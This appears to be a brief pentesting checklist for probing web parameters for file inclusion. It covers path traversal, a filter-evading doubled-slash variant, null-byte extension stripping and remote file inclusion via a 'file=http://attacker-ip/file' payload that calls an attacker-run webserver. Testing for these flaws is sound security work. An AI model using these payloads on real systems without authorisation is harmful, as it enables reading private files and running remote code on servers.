- Do the tests in the input and the URL
1. Check normal path traversal
2. Check path traversal with double backslash (..//..//..//..//), avoids word filtering.
3. Try null byte at the end (%00) (fixed since PHP 5.3.4), removes the extension added by the server.
4. If a *directory* is required: file=*directory*/../../../..
5. If RFI allowed, open a webserver a access with file=http://attacker-ip/file